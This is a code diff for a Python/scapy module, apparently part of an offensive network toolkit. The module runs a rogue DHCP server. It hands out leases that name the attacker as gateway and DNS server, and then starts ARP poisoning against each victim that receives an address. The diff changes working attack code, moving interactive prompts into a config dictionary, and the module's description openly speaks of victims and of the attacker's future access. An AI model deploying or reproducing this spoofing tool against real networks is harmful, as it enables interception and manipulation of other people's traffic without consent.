@@ -3,43 +3,45 @@ from threading import Thread
 from poison import Poison
 from scapy.all import *
 
-""" Set up a rogue DHCP server and hand out IP addresses.  Once an IP has been dispensed, an
-    ARP poisoning session will be initiated for the host.  If the rogue DHCP is shutdown with hosts,
-    the ARP poisoning session will be destroyed, but the victim IP addresses we handed out will be the same.
-    This will allow the attacker an ability to configure an ARP poisoning session in the future if they so choose.
-
-    ARP poisons will not appear under sessions, but will instead be managed by the spoofed_hosts dictionary.
-    Configure sniffers for traffic.
-"""
-
 
 class dhcp(Poison):
     def __init__(self):
+        super(dhcp, self).__init__('DHCP Spoof')
         conf.verb = 0
         self.local_mac = get_if_hwaddr(conf.iface)
         self.spoofed_hosts = {}
         self.curr_ip = None
-        self.gateway = None
-        self.net_mask = None
-        super(dhcp, self).__init__('DHCP Spoof')
+        self.config.update({"gateway":{"type":"ip", 
+                                       "value":None,
+                                       "required":True, 
+                                       "display":"Spoofed gateway address"},
+                            "net_mask":{"type":"ipmask", 
+                                        "value":None,
+                                        "required":True, 
+                                 "display":"Netmask to distribute IPs from"},
+                          })
+        self.info = """
+                    Set up a rogue DHCP server and hand out IP addresses.  
+                    Once an IP has been dispensed, an ARP poisoning session 
+                    will be initiated for the host.  If the rogue DHCP is 
+                    shutdown with hosts, the ARP poisoning session will be 
+                    destroyed, but the victim IP addresses we handed out 
+                    will be the same.  This will allow the attacker an ability
+                    to configure an ARP poisoning session in the future if they
+                    so choose.
+
+                    ARP poisons will not appear under sessions, but will 
+                    instead be managed by the spoofed_hosts dictionary.
+                    Configure sniffers for traffic.
+                    """
 
     def initialize(self):
-        try:
-            self.gateway = raw_input('[!] Enter (spoofed) gateway: ')
-            self.net_mask = raw_input('[!] Enter netmask to hand IPs out from: ')
-            tmp = raw_input('[!] Forward all traffic to %s.  Assign IP\'s from %s.  Is this correct? '%(self.gateway,self.net_mask))
-            if 'n' in tmp.lower():
-                return False
-            util.Msg('Configuring rogue DHCP server..')
-            thread = Thread(target=self.netsniff)
-            thread.start()
-            self.running = True
-            return True
-        except KeyboardInterrupt:
-            return False
-        except Exception, j:
-            util.Error('[-] Error: %s' % j)
-            return False
+        util.Msg("Configuring rogue DHCP server...")
+        self.running = True
+
+        thread = Thread(target=self.netsniff)
+        thread.start()
+        return True
 
     def netsniff(self):
         """ Packet sniffer """
@@ -54,6 +56,7 @@ class dhcp(Poison):
             New systems with DHCPDISCOVER first; in this case, we can quite easily gain control, give it
             our own address, and ARPP it.
         """
+        gateway = self.config['gateway']['value']
         # is this a DHCP packet!?
         if self.running and DHCP in pkt:
             for opt in pkt[DHCP].options:
@@ -77,21 +80,22 @@ class dhcp(Poison):
                         else:
                             # ip is in use; generate another
                             if self.curr_ip is None:
-                                self.curr_ip = self.net_mask.split('/')[0]
+                                self.curr_ip = self.config['net_mask']['value']\
+                                                    .split('/')[0]
                             else:
                                 self.curr_ip = util.next_ip(self.curr_ip)
 
                     lease = Ether(dst='ff:ff:ff:ff:ff:ff', src=hw)
-                    lease /= IP(src=self.gateway, dst='255.255.255.255')
+                    lease /= IP(src=gateway, dst='255.255.255.255')
                     lease /= UDP(sport=67, dport=68)
                     lease /= BOOTP(op=2, chaddr=mac2str(pkt[Ether].src),
                                         yiaddr=self.curr_ip, xid=pkt[BOOTP].xid)
                     lease /= DHCP(options=[('message-type', 'ack'),
-                                           ('server_id', self.gateway),
+                                           ('server_id', gateway),
                                            ('lease_time', 86400),
                                            ('subnet_mask', '255.255.255.0'),
-                                           ('router', self.gateway),
-                                           ('name_server', self.gateway),
+                                           ('router', gateway),
+                                           ('name_server', gateway),
                                            'end'])
                     sendp(lease, loop=False)
 
@@ -101,7 +105,7 @@ class dhcp(Poison):
                     tmp = ARPSpoof()
 
                     victim = (to_ip, getmacbyip(to_ip))
-                    target = (self.gateway, hw)
+                    target = (gateway, hw)
                     tmp.victim = victim
                     tmp.target = self.curr_ip
                     if not tmp.initialize_post_spoof() is None:
@@ -116,21 +120,22 @@ class dhcp(Poison):
                     fam, hw = get_if_raw_hwaddr(conf.iface)
 
                     if self.curr_ip is None:
-                        self.curr_ip = self.net_mask.split('/')[0]
+                        self.curr_ip = self.config['net_mask']['value']\
+                                                    .split('/')[0]
                     else:
                         self.curr_ip = util.next_ip(self.curr_ip)
 
                     # build and send the DHCP Offer
                     offer = Ether(dst='ff:ff:ff:ff:ff:ff', src=hw)
-                    offer /= IP(src=self.gateway, dst='255.255.255.255')
+                    offer /= IP(src=gateway, dst='255.255.255.255')
                     offer /= UDP(sport=67, dport=68)
                     offer /= BOOTP(op=2, chaddr=mac2str(pkt[Ether].src),
                                     yiaddr=self.curr_ip, xid=pkt[BOOTP].xid)
                     offer /= DHCP(options=[('message-type', 'offer'),
                                            ('subnet_mask', '255.255.255.0'),
                                            ('lease_time', 86400),
-                                           ('name_server', self.gateway),
-                                           ('router', self.gateway),
+                                           ('name_server', gateway),
+                                           ('router', gateway),
                                             'end'])
                     sendp(offer, loop=False)
                     log_msg('Sent DHCP offer for \'%s\' to \'%s\''
@@ -140,7 +145,8 @@ class dhcp(Poison):
         """ Overriden view for dumping gateway/hosts
             before going into dump data mode
         """
-        print '\033[33m[!] Spoofed gateway: \033[32m%s\033[0m' % self.gateway
+        print '\033[33m[!] Spoofed gateway: \033[32m%s\033[0m' % \
+                                             self.config['gateway']['value']
         print '\033[33m[!] Currently Spoofing:\033[0m'
         for key in self.spoofed_hosts:
             print '\t\033[32m[+] %s\033[0m' % self.spoofed_hosts[key].to_ip
